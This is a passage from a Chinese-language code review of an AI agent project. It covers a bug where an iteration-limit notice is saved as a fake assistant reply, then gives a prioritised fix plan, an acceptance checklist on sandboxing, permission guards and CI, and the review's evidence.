具体咬人路径：超限文案作为 `done` 落盘成 assistant 消息 → CLI 渲染成模型正常回答 → 下一轮模型看到一条"自己说过"的英文系统提示，可能继续按错误前提工作 → 子 agent 路径把它当有效结果回投（不是 `error` 就不算失败）。

**改进方案**

1. `in_queue` 设 `maxsize`；满时给"忙，已排队"反馈而非无限堆积。
2. 超限改为 `error` 事件 + 结构化 code；不落盘为 assistant 正文。
3. 顺带把空回复、截断等错误统一成结构化错误码。

**验收标准**：超限场景历史里不出现伪造的 assistant 回答；队列满时行为可预测。**代价**：低。

---

## 5. 建议执行顺序（按 ROI）

| 顺序 | 内容 | 为什么是它 | 前置 |
|---|---|---|---|
| 1 | P1-4 CI + dev 依赖 + 放宽 Python 版本 | 后面所有改动的安全网，成本最低 | 无 |
| 2 | P1-0 网络：无人值守先拒 + 双向探针 + 风险成文 | 不改日常体验即可切断最危险的自动外泄路径；行为修复正好借刚上的 CI 验证 | 1 |
| 3 | P1-3 模板生成保护 + 往返测试 | 十分钟消除一个静默自毁开关 | 无 |
| 4 | P2-4 守卫必装断言 + metadata AST 测试 + compact 字段化 | 安全语义补强，成本低 | 1 |
| 5 | P0-1 抽 ChannelService、拆 CLI | 收益最大的重构，纯搬运可用现有测试兜底 | 1 |
| 6 | ~~P0-2 第一步：消灭导入期 IO~~（已完成，第二步一并落地） | 解锁测试隔离，改动机械 | 1 |
| 7 | P1-1 轮次标记与启动期修复 | 把"约定正确"换成"结构正确" | 6 |
| 8 | P1-2 同步 IO 下线程 + 索引缓存 | 用户可感知的流畅度提升 | 6 |
| 9 | P2-1 能力注入 + provider 无状态化 | core 可独立测试 | 6 |
| 10 | P2-3 结构化日志与轮次摘要 | 之后所有排障变快 | 无（可随时） |
| 11 | P2-2 / P2-5 收尾 | 清死代码、补边界 | 无 |

原则：**先让改动可被自动验证（1），再做小而险的行为修复（2–4），然后做结构改动（5–9），最后语义增强（10–11）。** 反过来做，等于在没有安全网的情况下拆承重墙。

---

## 6. 总验收清单

- [ ] 无人值守来源（scheduler / subagent）的 shell 无网络；网络双向探针通过；拒绝有扩权指引；`docs/sandbox.md` 有读×网络的成文决策
- [ ] `import zero.*` 不产生任何文件 IO 或子进程
- [ ] `cli.py < 400` 行，且不直接调用 `SessionStore` / `SchedulerStore`
- [ ] 新增一个会话功能只改 `ChannelService` + 各通道展示
- [ ] 事件循环单次阻塞 < 50ms（含大历史场景）
- [ ] 模拟进程中断后，历史可直接发给模型，无 400
- [ ] 任意读路径调用历史加载不会写盘
- [ ] 缺少权限守卫时进程拒绝启动
- [ ] `metadata` 在核心代码中零读取，且有测试守住
- [ ] 迭代超限不落盘为 assistant 正文
- [ ] 同一 provider 实例并发两条流互不干扰
- [ ] CI 在 PR 上跑 pytest + ruff，全量用例零 error（不适用平台 skip），删关键代码会变红

---

## 7. 附：复审方法与证据

- 评审基础：`zero/` 58 个 Python 模块（约 9.3k 行）与 `tests/` 19 个测试文件（约 3.9k 行）的通读（前版完成全量通读，本版重点复核权限、存储、并发、通道四条链路）。
- 本版独立实测/复核的证据：
  - `.venv/bin/python -m pytest` → `No module named pytest`（实测复现）；
  - `chat_with_llm` 全仓库零调用方（grep 复现）；
  - `network` 字段恒 True、`guard.py` 零处消费、`UNGRANTABLE_READ` 仅 9 路径（代码走读 + grep 复现）——P1-0 的三个事实支柱。
  - POSIX shell 为无 shell 直接 exec（`shlex.split` + `create_subprocess_exec`），据此修正了 P1-0 的外泄示例（[context.py:27](../zero/core/context.py#L27)、[shell.py:100](../zero/tools/shell.py#L100)）。
- P1-2 中的耗时数字为量级估算，落地前应实测。
- 未评审前端 `static/index.html`（1161 行内联 JS）内部质量，不影响上述结论。

最后一点，两版评审完全一致的核心判断：**这个项目的作者不是"没意识到问题"——`save_config` 的继承陷阱、`persist_repair` 的并发风险，作者都在注释里预判过。问题是"意识到但选择用注释兜底，而不是用结构兜底"。** 本评审的全部要义，就是把那些注释变成代码和测试；再加上一条：把"接受的风险"也变成成文的决策——读×网络这一个是目前最大的欠账。
